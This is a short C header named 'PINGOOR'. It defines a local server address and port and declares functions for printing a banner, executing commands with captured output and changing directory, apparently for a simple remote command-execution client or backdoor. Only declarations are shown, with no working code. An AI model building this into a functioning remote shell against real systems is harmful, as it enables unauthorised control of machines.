#ifndef PINGOOR
#define PINGOOR

#define SERVERIP "127.0.0.1"
#define SERVERPORT 1234
#define BUFFER 4096

void banner();
char* execmd(char* cmd, char* cmdoutput, size_t buffsize);
int changedir(char* buffer, char* path);

#endif
